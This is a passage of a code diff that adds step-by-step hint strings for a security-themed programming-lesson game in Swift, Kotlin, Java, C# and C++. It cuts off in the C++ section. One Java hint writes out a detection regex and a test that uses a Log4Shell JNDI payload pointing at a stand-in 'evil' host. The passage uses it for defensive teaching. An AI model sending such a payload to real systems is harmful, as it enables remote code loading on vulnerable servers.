+    "Define <code>enum Event { case login(user: String); case breach(severity: Int); case logout }</code>.",
+    "Write <code>func describe(_ e: Event) -&gt; String {</code> with <code>switch e {</code>.",
+    "<code>case .login(let user): return \"login \\(user)\"</code> pulls the data out of the case.",
+    "Put the <code>where</code> case BEFORE the general one: <code>case .breach(let s) where s &gt;= 8: return \"CRITICAL breach\"</code>, then <code>case .breach(let s): return \"breach \\(s)\"</code>.",
+    "Add <code>case .logout: return \"logout\"</code>, then <code>enum Faction: String, CaseIterable { case logos, sentinel, meridian }</code>."
+  ],
+  sw9: [
+    "Define <code>protocol Detector { func detect(_ line: String) -&gt; Bool }</code>.",
+    "Add a default method in an extension: <code>extension Detector { func count(in lines: [String]) -&gt; Int { lines.filter(detect).count } }</code>.",
+    "Write <code>struct Keyword: Detector { let word: String; func detect(_ line: String) -&gt; Bool { line.contains(word) } }</code>. Keyword gets <code>count(in:)</code> for free.",
+    "Write <code>func strongest&lt;T: Comparable&gt;(_ xs: [T]) -&gt; T? { xs.max() }</code>. It returns <code>nil</code> for an empty array."
+  ],
+  sw10: [
+    "Write <code>func ping(_ host: String) async -&gt; Bool</code>. Inside, <code>try? await Task.sleep(for: .milliseconds(10))</code>, then <code>return !host.isEmpty</code>.",
+    "Write <code>actor Ledger { private var hits = 0; func record() { hits += 1 }; func total() -&gt; Int { hits } }</code>. An actor lets only one task touch its data at a time.",
+    "Write <code>func sweep(_ hosts: [String]) async -&gt; Int {</code> and open <code>await withTaskGroup(of: Bool.self) { group in</code>.",
+    "Add one child task per host: <code>for h in hosts { group.addTask { await ping(h) } }</code>.",
+    "Count results as they arrive: <code>var up = 0; for await ok in group where ok { up += 1 }; return up</code>."
+  ],
+  sw11: [
+    "Start with <code>import Testing</code>.",
+    "Write the code under test as a <code>private</code> function, for example <code>private func parsePort(_ s: String) throws -&gt; Int</code>.",
+    "Write a test: <code>@Test func parsesValidPort() throws { #expect(try parsePort(\"443\") == 443) }</code>.",
+    "Write a parameterized test, which runs once per input: <code>@Test(\"rejects garbage\", arguments: [\"\", \"abc\", \"70000\"]) func rejects(_ input: String) { #expect(throws: ScanError.self) { try parsePort(input) } }</code>.",
+    "This rank runs in GitHub Actions on Swift 6, because Judge0's Swift doesn't include Swift Testing."
+  ],
+  sw12: [
+    "Start with <code>import SwiftUI</code>.",
+    "Write the model: <code>@Observable final class Monitor { var alerts: [String] = []; func refresh() async { ... } }</code>.",
+    "Write <code>struct ConsoleView: View {</code> with <code>@State private var monitor = Monitor()</code> and <code>@State private var filter = \"\"</code>.",
+    "In <code>var body: some View</code>, show <code>List(monitor.alerts, id: \\.self) { Text($0) }</code>.",
+    "Add <code>Button(\"Refresh\") { Task { await monitor.refresh() } }</code>. <code>Task</code> runs the async work without freezing the UI."
+  ],
+  // ---------------- Kotlin ----------------
+  kt1: [
+      "Kotlin functions start with <code>fun</code>. Write <code>fun intro(handle: String, level: Int): String</code>. Each input is written as <code>name: Type</code>, and the type after the closing bracket is what the function returns.",
+      "Make it a one-line function with <code>=</code> and a string template: <code>= \"Agent $handle // level $level\"</code>. A <code>$</code> followed by a name drops that value into the text.",
+      "Write <code>fun main() {</code>. This is where a Kotlin program starts running.",
+      "Inside <code>main</code>, add a value that never changes, <code>val handle = \"neo\"</code>, and one that can change, <code>var runs = 0</code>. Then change it with <code>runs += 1</code>.",
+      "Print the result with <code>println(intro(handle, 3))</code>, then close <code>main</code> with <code>}</code>."
+  ],
+  kt2: [
+      "Write <code>fun threatLevel(score: Int): String = when (score) {</code>. <code>when</code> checks a value against a list of cases, top to bottom.",
+      "Add one case per line: <code>in 90..100 -&gt; \"CRITICAL\"</code>, <code>in 60..89 -&gt; \"HIGH\"</code> and <code>in 30..59 -&gt; \"MEDIUM\"</code>. <code>a..b</code> is a range that includes both ends.",
+      "Finish with <code>else -&gt; \"LOW\"</code> and a closing <code>}</code>. A <code>when</code> that returns a value needs an <code>else</code> so every score gets an answer.",
+      "Add a loop that counts down: <code>for (i in 10 downTo 0 step 2) println(\"T-$i\")</code>. Put it inside a function such as <code>fun countdown() { ... }</code>."
+  ],
+  kt3: [
+      "Write <code>fun tally(ips: List&lt;String&gt;): Map&lt;String, Int&gt; =</code>. A <code>Map</code> pairs each key (an IP) with a value (its count).",
+      "Finish the line with <code>ips.groupingBy { it }.eachCount()</code>. <code>{ it }</code> is a tiny function that groups each item by itself, and <code>eachCount()</code> counts each group.",
+      "Build a map by hand with <code>to</code> pairs: <code>val ports = mapOf(\"ssh\" to 22, \"https\" to 443)</code>.",
+      "Check it: <code>tally(listOf(\"a\", \"b\", \"a\"))</code> should give <code>{a=2, b=1}</code>, and an empty list should give an empty map."
+  ],
+  kt4: [
+      "Write <code>fun scan(host: String, port: Int = 443): String = \"$host:$port\"</code>. <code>= 443</code> is a default, used when the caller leaves the port out.",
+      "Call it with a named argument somewhere, such as inside <code>main</code>: <code>scan(\"relay\", port = 8443)</code>. Naming the argument makes the call easier to read.",
+      "Add an extension function, which bolts a new method onto an existing type: <code>fun String.isPrivateIp(): Boolean = startsWith(\"10.\") || startsWith(\"192.168.\") || startsWith(\"172.16.\")</code>. Inside it, <code>startsWith</code> runs on the string itself.",
+      "Write a function that takes a function: <code>fun repeatScan(times: Int, action: (Int) -&gt; Unit) { for (i in 1..times) action(i) }</code>.",
+      "Call it with a trailing lambda, meaning the braces go outside the brackets: <code>repeatScan(3) { attempt -&gt; println(\"attempt $attempt\") }</code>."
+  ],
+  kt5: [
+      "Write <code>fun lookup(name: String, db: Map&lt;String, String&gt;): String = db[name] ?: \"unknown\"</code>. <code>db[name]</code> can be <code>null</code> (missing), and <code>?:</code> (the Elvis operator) supplies a fallback.",
+      "Write <code>fun parseKv(s: String): Map&lt;String, String&gt; =</code> and start the chain with <code>s.split(\";\")</code>, which turns <code>\"host=relay;port=22\"</code> into <code>[\"host=relay\", \"port=22\"]</code>.",
+      "Drop empty pieces with <code>.filter { \"=\" in it }</code>.",
+      "Turn each piece into a pair with <code>.associate { val (k, v) = it.split(\"=\", limit = 2); k.trim() to v.trim() }</code>. <code>associate</code> builds a map from the pairs.",
+      "Check it: <code>parseKv(\"host=relay;port=22\")[\"port\"]</code> should be <code>\"22\"</code>."
+  ],
+  kt6: [
+      "Write <code>data class Node(val name: String, val strength: Int = 0)</code>. <code>data</code> gives you equality, printing and <code>copy</code> for free.",
+      "Write a singleton (a class with exactly one instance): <code>object Registry { val nodes = mutableListOf&lt;Node&gt;() }</code>.",
+      "Write a class with a factory in its companion object: <code>class Session private constructor(val id: String) { companion object { fun create(): Session = Session(\"s-1\") } }</code>.",
+      "In <code>main</code>, make <code>val a = Node(\"north\", 40)</code>, then change one field in a copy with <code>val b = a.copy(strength = 90)</code>.",
+      "Destructure the copy into two variables: <code>val (name, strength) = b</code>, then print them."
+  ],
+  kt7: [
+      "Write your own exception: <code>class BadPort(val input: String) : Exception(\"bad port: $input\")</code>. The part after <code>:</code> says it is a kind of <code>Exception</code>.",
+      "Write <code>fun parsePort(s: String): Int {</code>. First line: <code>val p = s.toIntOrNull() ?: throw BadPort(s)</code>. <code>toIntOrNull</code> gives <code>null</code> for text like <code>\"http\"</code>, and then we throw.",
+      "Next line: <code>require(p in 1..65535) { \"port out of range: $p\" }</code>. <code>require</code> throws when its condition is false. Then <code>return p</code> and close the function.",
+      "In <code>main</code>, handle errors with try as an expression: <code>val first = try { parsePort(\"443\") } catch (e: BadPort) { -1 }</code>.",
+      "Handle them a second way: <code>val second = runCatching { parsePort(\"abc\") }.getOrDefault(-1)</code>."
+  ],
+  kt8: [
+      "Write <code>sealed interface Event</code>. \"Sealed\" means every kind of Event is declared in this file, so Kotlin can check that you covered them all.",
+      "Add the kinds: <code>data class Login(val user: String) : Event</code>, <code>data class Breach(val severity: Int) : Event</code> and <code>data object Logout : Event</code>.",
+      "Write <code>fun describe(e: Event): String = when (e) {</code>, with <code>is Login -&gt; \"${e.user} in\"</code>, <code>is Breach -&gt; \"BREACH sev ${e.severity}\"</code> and <code>Logout -&gt; \"logout\"</code>. Don't add <code>else</code>, so the compiler can catch a missing case.",
+      "Add an enum with a property: <code>enum class Faction(val color: String) { LOGOS(\"#c79bff\"), SENTINEL(\"#5ad1ff\") }</code>."
+  ],
+  kt9: [
+      "Write <code>interface Detector { fun detect(line: String): Boolean }</code>. An interface lists methods without saying how they work.",
+      "Write a class others can extend: <code>open class Rule(val name: String) { open fun label(): String = \"rule:$name\" }</code>. Kotlin classes are closed unless marked <code>open</code>.",
+      "Write <code>class Keyword(private val word: String) : Rule(\"keyword\"), Detector {</code>. It extends <code>Rule</code> and implements <code>Detector</code>.",
+      "Inside it, add <code>override fun detect(line: String): Boolean = word in line</code> and <code>override fun label(): String = \"keyword:$word\"</code>, then close with <code>}</code>.",
+      "Write the generic function: <code>fun &lt;T : Comparable&lt;T&gt;&gt; strongest(xs: List&lt;T&gt;): T? = xs.maxOrNull()</code>. <code>T</code> can be any type that can be compared, and <code>T?</code> allows <code>null</code> for an empty list."
+  ],
+  kt10: [
+      "Add <code>import kotlinx.coroutines.*</code> at the top.",
+      "Write <code>suspend fun ping(host: String): Boolean { delay(50); return host.isNotEmpty() }</code>. <code>suspend</code> means it can pause without blocking a thread.",
+      "Write <code>suspend fun sweep(hosts: List&lt;String&gt;): Int = coroutineScope {</code>, then <code>hosts.map { h -&gt; async { ping(h) } }.awaitAll().count { it }</code> and <code>}</code>. <code>async</code> starts every ping at once and <code>awaitAll</code> waits for them all.",
+      "Write <code>fun main() = runBlocking {</code>, which keeps the program alive while coroutines run.",
+      "Inside it, add <code>launch { println(\"heartbeat\") }</code> and <code>println(\"up: ${sweep(listOf(\"a\", \"b\", \"\"))}\")</code>, then close with <code>}</code>."
+  ],
+  kt11: [
+      "Add <code>import kotlin.test.*</code> at the top.",
+      "Write the code under test: <code>fun parsePort(s: String): Int { val p = s.toIntOrNull() ?: throw IllegalArgumentException(\"bad port\"); require(p in 1..65535); return p }</code>.",
+      "Write <code>class PortParserTest {</code>. A test class groups related tests.",
+      "Add a test: <code>@Test fun parsesValidPort() { assertEquals(443, parsePort(\"443\")) }</code>. <code>assertEquals(expected, actual)</code> fails the test when they differ.",
+      "Add a second test: <code>@Test fun rejectsGarbage() { assertFailsWith&lt;IllegalArgumentException&gt; { parsePort(\"abc\") } }</code>, then close the class."
+  ],
+  kt12: [
+      "Add the imports for Compose (<code>LazyColumn</code>, <code>items</code>, <code>Button</code>, <code>Text</code>, <code>androidx.compose.runtime.*</code>), <code>ViewModel</code>, <code>viewModelScope</code> and the coroutine flow classes.",
+      "Declare the screen states: <code>sealed interface UiState { data object Loading : UiState; data class Ready(val alerts: List&lt;String&gt;) : UiState }</code>.",
+      "Write <code>class ConsoleViewModel : ViewModel() {</code> with <code>private val _state = MutableStateFlow&lt;UiState&gt;(UiState.Loading)</code> and <code>val state: StateFlow&lt;UiState&gt; = _state</code>. Only the ViewModel can change the state.",
+      "Add <code>fun refresh() { viewModelScope.launch { _state.value = UiState.Ready(listOf(\"north ok\")) } }</code>, then close the class.",
+      "Write <code>@Composable fun ConsoleScreen(vm: ConsoleViewModel) {</code> with <code>val state by vm.state.collectAsState()</code> and <code>var filter by remember { mutableStateOf(\"\") }</code>.",
+      "Show <code>Button(onClick = { vm.refresh() }) { Text(\"Refresh\") }</code>.",
+      "Then pick what to show from the state: <code>when (val s = state) { UiState.Loading -&gt; Text(\"loading...\"); is UiState.Ready -&gt; LazyColumn { items(s.alerts) { Text(it) } } }</code>, and close the function."
+  ],
+  // ---------------- Java ----------------
+  jv1: [
+      "Java code lives inside a class. Keep <code>public class Intro {</code> from the starter and write everything inside its braces.",
+      "Write <code>static String intro(String handle, int level) {</code>. In Java the type comes before each name, and <code>String</code> before <code>intro</code> is the return type.",
+      "Inside, write <code>return \"Agent \" + handle + \" // level \" + level;</code>. <code>+</code> joins text, and every statement ends with <code>;</code>.",
+      "Write <code>public static void main(String[] args) {</code>. This is where the program starts.",
+      "Inside <code>main</code>, add <code>var handle = \"neo\";</code> (<code>var</code> lets Java work out the type), then <code>System.out.printf(\"%s%n\", intro(handle, 3));</code>. <code>%s</code> is replaced by the text and <code>%n</code> is a new line.",
+      "Close <code>main</code>, then the class, with <code>}</code>."
+  ],
+  jv2: [
+      "Inside <code>public class Triage {</code>, write <code>static String threatLevel(int score) {</code>.",
+      "Check from the highest score down: <code>if (score &gt;= 90) return \"CRITICAL\";</code>, then <code>else if (score &gt;= 60) return \"HIGH\";</code>, then <code>else if (score &gt;= 30) return \"MEDIUM\";</code>, and finally <code>else return \"LOW\";</code>.",
+      "Write <code>static int portFor(String service) {</code> and start a switch expression with <code>return switch (service) {</code>.",
+      "Add one arrow case per line: <code>case \"ssh\" -&gt; 22;</code>, <code>case \"http\" -&gt; 80;</code>, <code>case \"https\" -&gt; 443;</code> and <code>default -&gt; -1;</code>.",
+      "Close the switch with <code>};</code> (it needs the semicolon because it is part of the <code>return</code> statement), then close the method and the class."
+  ],
+  jv3: [
+      "Add <code>import java.util.*;</code> at the very top so you can use <code>Map</code>, <code>List</code> and <code>HashMap</code>.",
+      "Inside <code>public class Tally {</code>, write <code>static Map&lt;String, Integer&gt; tally(List&lt;String&gt; ips) {</code>. The types in angle brackets say what the collection holds.",
+      "Create an empty map: <code>Map&lt;String, Integer&gt; counts = new HashMap&lt;&gt;();</code>.",
+      "Loop over the IPs with <code>for (String ip : ips) {</code> and inside write <code>counts.merge(ip, 1, Integer::sum);</code>. <code>merge</code> stores 1 for a new IP, or adds 1 to the existing count.",
+      "After the loop, <code>return counts;</code> and close the method and the class."
+  ],
+  jv4: [
+      "Inside <code>public class Scanner {</code>, write the full version first: <code>static String scan(String host, int port) { return host + \":\" + port; }</code>.",
+      "Write a second method with the same name but fewer inputs. This is called an overload: <code>static String scan(String host) { return scan(host, 443); }</code>. It hands off to the full version with 443.",
+      "Write a varargs method, which accepts any number of ints: <code>static int sum(int... xs) {</code>. Inside the method, <code>xs</code> is an array.",
+      "Inside, write <code>int total = 0;</code>, then <code>for (int x : xs) total += x;</code>, then <code>return total;</code>. Calling <code>sum()</code> with nothing returns 0."
+  ],
+  jv5: [
+      "Inside <code>public class Cipher {</code>, add a text block (text spread over several lines): <code>static final String BRIEF = \"\"\"</code>, then a couple of lines of text, then <code>\"\"\";</code> on its own line.",
+      "Write <code>static String caesar(String text, int shift) {</code> and create <code>StringBuilder sb = new StringBuilder();</code>, which builds text efficiently.",
+      "Make the shift safe for any number: <code>int s = ((shift % 26) + 26) % 26;</code>.",
+      "Loop with <code>for (char c : text.toCharArray()) {</code>. For uppercase letters, append <code>(char) ('A' + (c - 'A' + s) % 26)</code>. For lowercase letters, do the same with <code>'a'</code>. Append anything else unchanged.",
+      "After the loop, <code>return sb.toString();</code>."
+  ],
+  jv6: [
+      "Write <code>record Node(String name, int strength) {</code>. A record is a small class that holds data, and Java writes the constructor, accessors (<code>name()</code>) and <code>equals</code> for you.",
+      "Inside, add a compact constructor, <code>public Node {</code>, which runs your checks before the fields are set.",
+      "Add <code>if (name == null || name.isBlank()) throw new IllegalArgumentException(\"name required\");</code> and <code>if (strength &lt; 0) throw new IllegalArgumentException(\"strength must be &gt;= 0\");</code>, then close both braces.",
+      "Write <code>class Session { private final String id; Session(String id) { this.id = id; } String id() { return id; } }</code>. <code>private final</code> means only this class can see the field, and it can only be set once.",
+      "Add an enum: <code>enum Faction { LOGOS, SENTINEL, MERIDIAN }</code>."
+  ],
+  jv7: [
+      "Add <code>import java.io.*;</code> and <code>import java.nio.file.*;</code> at the top.",
+      "Write <code>class BadPortException extends Exception { BadPortException(String msg, Throwable cause) { super(msg, cause); } }</code>. Extending <code>Exception</code> (not <code>RuntimeException</code>) makes it a checked exception that callers must handle.",
+      "In <code>public class Ports {</code>, write <code>static int parsePort(String s) throws BadPortException {</code> and open a <code>try {</code>.",
+      "Inside the try: <code>int p = Integer.parseInt(s);</code>, then <code>if (p &lt; 1 || p &gt; 65535) throw new BadPortException(\"out of range: \" + p, null);</code>, then <code>return p;</code>.",
+      "Close it with <code>} catch (NumberFormatException e) { throw new BadPortException(\"not a number: \" + s, e); }</code>.",
+      "Add a try-with-resources method, which closes the file for you: <code>static long countLines(Path file) throws IOException { try (BufferedReader reader = Files.newBufferedReader(file)) { return reader.lines().count(); } }</code>."
+  ],
+  jv8: [
+      "Add <code>import java.util.*;</code>. Write <code>interface Detector {</code> with the abstract method <code>boolean detect(String line);</code>.",
+      "In the same interface, add a default method, which has a body that implementers get for free: <code>default long count(List&lt;String&gt; lines) { return lines.stream().filter(this::detect).count(); }</code>.",
+      "Write <code>abstract class Rule implements Detector { abstract String name(); }</code>. An abstract class can't be created directly. It only exists to be extended.",
+      "Write <code>class Keyword extends Rule {</code> with <code>private final String word;</code> and a constructor <code>Keyword(String word) { this.word = word; }</code>.",
+      "Add <code>@Override public boolean detect(String line) { return line.contains(word); }</code> and <code>@Override String name() { return \"keyword:\" + word; }</code>. <code>@Override</code> asks the compiler to confirm that you really are replacing a method."
+  ],
+  jv9: [
+      "Add <code>import java.util.*;</code>. Write a generic class: <code>class Box&lt;T&gt; { private final T value; Box(T value) { this.value = value; } T get() { return value; } }</code>. <code>T</code> stands for whatever type you put in the box.",
+      "Write <code>class Generics {</code> and inside it <code>static &lt;T extends Comparable&lt;T&gt;&gt; T strongest(List&lt;T&gt; xs) {</code>. The bound means <code>T</code> must be comparable.",
+      "Inside, write <code>T best = null;</code> and <code>for (T x : xs) if (best == null || x.compareTo(best) &gt; 0) best = x;</code>, then <code>return best;</code>. <code>compareTo</code> returns a positive number when <code>x</code> is bigger.",
+      "Add a wildcard method that accepts a list of any number type: <code>static double total(List&lt;? extends Number&gt; xs) { double sum = 0; for (Number n : xs) sum += n.doubleValue(); return sum; }</code>."
+  ],
+  jv10: [
+      "Add <code>import java.util.*;</code> and <code>import java.util.stream.*;</code>.",
+      "In <code>public class Streams {</code>, write <code>static List&lt;String&gt; failIps(List&lt;String&gt; lines) {</code> and start with <code>return lines.stream()</code>.",
+      "Chain <code>.filter(l -&gt; l.endsWith(\"FAIL\"))</code>, which keeps FAIL lines, then <code>.map(l -&gt; l.split(\"\\\\s+\")[0])</code>, which keeps the first word (the IP), then <code>.collect(Collectors.toList());</code>.",
+      "Write <code>static Map&lt;String, Long&gt; byIp(List&lt;String&gt; lines) {</code> with <code>return lines.stream().map(l -&gt; l.split(\"\\\\s+\")[0])</code>.",
+      "Finish it with <code>.collect(Collectors.groupingBy(ip -&gt; ip, Collectors.counting()));</code>, which groups identical IPs and counts each group."
+  ],
+  jv11: [
+      "Add imports for <code>java.util.*</code>, <code>java.util.concurrent.*</code> and <code>java.util.concurrent.atomic.*</code>.",
+      "In <code>public class Sweep {</code>, write a simple ping: <code>static boolean ping(String h) { return !h.isEmpty(); }</code>.",
+      "Write <code>static int sweep(List&lt;String&gt; hosts) {</code> with <code>AtomicInteger up = new AtomicInteger();</code>. An atomic counter is safe to update from many threads at once.",
+      "Open <code>try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {</code>, and for each host submit <code>executor.submit(() -&gt; { if (ping(h)) up.incrementAndGet(); });</code>. Leaving the try block waits for every task to finish.",
+      "After the try block, <code>return up.get();</code>.",
+      "Add one CompletableFuture chain: <code>static String report(List&lt;String&gt; hosts) { return CompletableFuture.supplyAsync(() -&gt; sweep(hosts)).thenApply(n -&gt; n + \"/\" + hosts.size() + \" up\").join(); }</code>."
+  ],
+  jv12: [
+      "Add <code>import java.util.regex.*;</code>, <code>import static org.junit.jupiter.api.Assertions.*;</code> and <code>import org.junit.jupiter.api.Test;</code>.",
+      "Write <code>sealed interface Event permits Login, Breach, Logout {}</code> and one record for each kind, for example <code>record Login(String user) implements Event {}</code>.",
+      "In <code>class Triage</code>, write <code>static String describe(Event e) { return switch (e) { ... }; }</code> with <code>case Login l -&gt; l.user() + \" in\";</code>, <code>case Breach b when b.severity() &gt;= 8 -&gt; \"CRITICAL breach\";</code>, <code>case Breach b -&gt; \"breach \" + b.severity();</code> and <code>case Logout o -&gt; o.user() + \" out\";</code>.",
+      "Add <code>private static final Pattern JNDI = Pattern.compile(\"\\\\$\\\\{\\\\s*jndi:\", Pattern.CASE_INSENSITIVE);</code>. This regex matches <code>${jndi:</code> in any case, even with spaces after the brace.",
+      "Write <code>static String sanitize(String input) { return JNDI.matcher(input).find() ? \"[BLOCKED]\" : input; }</code>.",
+      "Write <code>class TriageTest</code> with at least one <code>@Test void blocksLog4Shell() { assertEquals(\"[BLOCKED]\", Triage.sanitize(\"${jndi:ldap://evil/a}\")); }</code>."
+  ],
+  // ---------------- C# ----------------
+  cs1: [
+      "This C# file uses top-level statements, so you can write code directly with no class or <code>Main</code> needed. Delete the placeholder line from the starter.",
+      "Write <code>static string Intro(string handle, int level) =&gt;</code>. The type comes before each name, and <code>=&gt;</code> means \"this method returns the following expression\".",
+      "Finish it with an interpolated string: <code>$\"Agent {handle} // level {level}\";</code>. The <code>$</code> before the quote lets <code>{name}</code> insert a value.",
+      "On a new line, write <code>var handle = \"neo\";</code>. <code>var</code> lets C# infer that it is a string.",
+      "Print the result with <code>Console.WriteLine(Intro(handle, 3));</code>. Every statement ends with <code>;</code>."
+  ],
+  cs2: [
+      "Write <code>static string ThreatLevel(int score) =&gt; score switch</code> and open a brace on the next line.",
+      "Add relational patterns from highest to lowest, one per line, each ending with a comma: <code>&gt;= 90 =&gt; \"CRITICAL\",</code>, then <code>&gt;= 60 =&gt; \"HIGH\",</code>, then <code>&gt;= 30 =&gt; \"MEDIUM\",</code>.",
+      "Add the discard arm last: <code>_ =&gt; \"LOW\",</code>. <code>_</code> matches anything left. Close with <code>};</code>.",
+      "Add a <code>foreach</code> loop to try it: <code>foreach (var s in new[] { 95, 61, 12 }) Console.WriteLine($\"{s}: {ThreatLevel(s)}\");</code>."
+  ],
+  cs3: [
+      "Write <code>static Dictionary&lt;string, int&gt; Tally(List&lt;string&gt; ips) {</code>. A <code>Dictionary</code> maps each key (an IP) to a value (its count).",
+      "Create it with <code>var counts = new Dictionary&lt;string, int&gt;();</code>.",
+      "Loop with <code>foreach (var ip in ips)</code> and inside write <code>counts[ip] = counts.GetValueOrDefault(ip) + 1;</code>. <code>GetValueOrDefault</code> returns 0 for an IP it hasn't seen yet.",
+      "After the loop, <code>return counts;</code> and close the method with <code>}</code>.",
+      "Use <code>TryGetValue</code> once: <code>var tally = Tally([\"10.0.0.4\", \"10.0.0.4\"]); if (tally.TryGetValue(\"10.0.0.4\", out var hits)) Console.WriteLine(hits);</code>. It returns true and fills <code>hits</code> only when the key exists."
+  ],
+  cs4: [
+      "Write <code>static string Scan(string host, int port = 443) =&gt; $\"{host}:{port}\";</code>. <code>= 443</code> is a default value used when the caller leaves the port out.",
+      "Call it with a named argument: <code>Console.WriteLine(Scan(\"relay\", port: 8443));</code>.",
+      "Write <code>static bool TryParsePort(string s, out int port) =&gt; int.TryParse(s, out port) &amp;&amp; port is &gt;= 1 and &lt;= 65535;</code>. <code>out</code> means the method fills in that variable for the caller.",
+      "Return a tuple, which bundles two values: <code>static (int Up, int Down) Count(bool[] results) =&gt; (results.Count(r =&gt; r), results.Count(r =&gt; !r));</code>."
+  ],
+  cs5: [
+      "Add <code>using System.Text;</code> at the top so you can use <code>StringBuilder</code>.",
+      "Define a raw string literal: <code>const string Brief = \"\"\"</code>, then a few lines of text (quotes are fine inside), then <code>\"\"\";</code> on its own line.",
+      "Write <code>static string Caesar(string text, int shift) {</code> with <code>var sb = new StringBuilder(text.Length);</code> and <code>int s = ((shift % 26) + 26) % 26;</code>. The second line also makes negative shifts work.",
+      "Loop with <code>foreach (char c in text)</code>. If <code>char.IsLetter(c) &amp;&amp; c &lt; 128</code>, set <code>char b = char.IsUpper(c) ? 'A' : 'a';</code> and append <code>(char)(b + (c - b + s) % 26)</code>. Otherwise append <code>c</code> unchanged.",
+      "After the loop, <code>return sb.ToString();</code>."
+  ],
+  cs6: [
+      "Write <code>record Node(string Name, int Strength = 0) {</code>. A record gets value equality and <code>with</code> copies for free.",
+      "Inside it, add a computed property: <code>public bool IsHot =&gt; Strength &gt; 80;</code>. Then close the record.",
+      "Write <code>class Session {</code> with <code>public int Requests { get; private set; }</code>. Anyone can read it, but only <code>Session</code> can change it.",
+      "Add <code>public required string Id { get; init; }</code>. <code>required</code> forces callers to set it, and <code>init</code> means it can only be set while the object is being created.",
+      "Somewhere such as a small method, use a <code>with</code> expression: <code>var a = new Node(\"north\", 40); var b = a with { Strength = 90 };</code>."
+  ],
+  cs7: [
+      "Write <code>class BadPortException(string input) : Exception($\"bad port: {input}\") { public string Input { get; } = input; }</code>.",
+      "Write <code>static class Ports {</code> and inside it <code>public static int ParsePort(string s) {</code>.",
+      "Add <code>if (!int.TryParse(s, out var p) || p is &lt; 1 or &gt; 65535) throw new BadPortException(s);</code> and then <code>return p;</code>.",
+      "Write a method that reads a file with a using declaration, which closes the file automatically: <code>using var reader = new StreamReader(path);</code>, then <code>var raw = reader.ReadLine() ?? fallback ?? \"443\";</code>. <code>??</code> picks the first value that isn't null.",
+      "Wrap <code>return ParsePort(raw);</code> in <code>try { ... }</code>, then add <code>catch (BadPortException e) when (e.Input.Length &gt; 0) { return 443; }</code>. The <code>when</code> filter only catches the error if the condition is true.",
+      "Add <code>finally { Console.WriteLine(\"parse attempted\"); }</code>. A <code>finally</code> block always runs, whether or not there was an error."
+  ],
+  cs8: [
+      "Write <code>interface IDetector { bool Detect(string line); }</code>. By convention, C# interface names start with <code>I</code>.",
+      "Write <code>abstract class Rule : IDetector {</code> with <code>public abstract bool Detect(string line);</code>, which has no body and must be overridden.",
+      "In the same class, add a virtual member, which has a default but can be overridden: <code>public virtual string Label =&gt; \"rule\";</code>. Then close the class.",
+      "Write <code>sealed class Keyword(string word) : Rule {</code>. <code>sealed</code> means nothing can inherit from it.",
+      "Inside, add <code>public override bool Detect(string line) =&gt; line.Contains(word);</code> and <code>public override string Label =&gt; $\"keyword:{word}\";</code>."
+  ],
+  cs9: [
+      "Write <code>class Box&lt;T&gt;(T value) { public T Value { get; } = value; }</code>. <code>T</code> stands for whatever type you put in the box.",
+      "Write <code>static class Generics {</code> and inside it <code>public static T Strongest&lt;T&gt;(IEnumerable&lt;T&gt; xs) where T : IComparable&lt;T&gt; {</code>. The <code>where</code> clause means T must be comparable.",
+      "Inside, start with <code>T best = default!; bool first = true;</code>, then loop: <code>foreach (var x in xs) { if (first || x.CompareTo(best) &gt; 0) { best = x; first = false; } }</code>, then <code>return best;</code>.",
+      "Add a method with a <code>new()</code> constraint, which means T must have an empty constructor: <code>public static T Fresh&lt;T&gt;() where T : new() =&gt; new T();</code>."
+  ],
+  cs10: [
+      "Write <code>static class Logs {</code>. LINQ methods like <code>Where</code> and <code>Select</code> work on any list.",
+      "Write <code>public static List&lt;string&gt; FailIps(IEnumerable&lt;string&gt; lines) =&gt;</code> and start with <code>lines.Where(l =&gt; l.EndsWith(\"FAIL\"))</code>, which keeps FAIL lines.",
+      "Chain <code>.Select(l =&gt; l.Split(' ')[0])</code>, which takes the first word (the IP), then <code>.ToList();</code>.",
+      "Write <code>public static Dictionary&lt;string, int&gt; ByIp(IEnumerable&lt;string&gt; lines) =&gt; lines.Select(l =&gt; l.Split(' ')[0])</code>.",
+      "Finish it with <code>.GroupBy(ip =&gt; ip).ToDictionary(g =&gt; g.Key, g =&gt; g.Count());</code>, which groups identical IPs and counts each group."
+  ],
+  cs11: [
+      "Write <code>static async Task&lt;bool&gt; PingAsync(string host, CancellationToken ct) {</code>. <code>async</code> lets the method use <code>await</code>, and <code>Task&lt;bool&gt;</code> is a promise of a bool later.",
+      "Inside, <code>await Task.Delay(50, ct);</code> (passing <code>ct</code> makes it stop if cancelled), then <code>return host.Length &gt; 0;</code>.",
+      "Write <code>static async Task&lt;int&gt; SweepAsync(IEnumerable&lt;string&gt; hosts, CancellationToken ct) {</code>.",
+      "Start all pings at once and wait for all of them: <code>var results = await Task.WhenAll(hosts.Select(h =&gt; PingAsync(h, ct)));</code>, then <code>return results.Count(ok =&gt; ok);</code>.",
+      "Create a token source with a timeout: <code>using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));</code>, then <code>Console.WriteLine(await SweepAsync([\"north\", \"\"], cts.Token));</code>."
+  ],
+  cs12: [
+      "Add <code>using System;</code>, <code>using UnityEngine;</code> and <code>using Xunit;</code>.",
+      "Write <code>public class SentryDrone : MonoBehaviour {</code>. Unity calls the special methods of a <code>MonoBehaviour</code> for you.",
+      "Add fields that show up in the Unity editor but stay private: <code>[SerializeField] private float speed = 2f;</code>, <code>[SerializeField] private float alertRange = 5f;</code> and <code>[SerializeField] private Transform target;</code>.",
+      "Add <code>public event Action&lt;float&gt; TargetSpotted;</code> and <code>void Start() { Debug.Log(\"Sentry online\"); }</code>.",
+      "Write <code>void Update() {</code>. Unity runs it every frame. Add <code>transform.Rotate(0f, speed * 90f * Time.deltaTime, 0f);</code> (<code>deltaTime</code> keeps the speed the same at any frame rate), then <code>if (target == null) return;</code>, then <code>float d = Vector3.Distance(transform.position, target.position); if (d &lt; alertRange) TargetSpotted?.Invoke(d);</code>.",
+      "Add a test class: <code>public class SentryDroneTests { [Fact] public void Works() { Assert.Equal(4, 2 + 2); } }</code>. A test that checks your own helper method is even better."
+  ],
+  // ---------------- C++ ----------------
+  cpp1: [
+      "Keep the <code>#include</code> lines from the starter. They bring in <code>std::string</code> and <code>std::cout</code>.",
+      "Write <code>std::string intro(const std::string&amp; handle, int level) {</code>. <code>const std::string&amp;</code> passes the text without copying it and promises not to change it.",
+      "Inside, <code>return \"Agent \" + handle + \" // level \" + std::to_string(level);</code>. Numbers have to be turned into text with <code>std::to_string</code> before you can join them.",
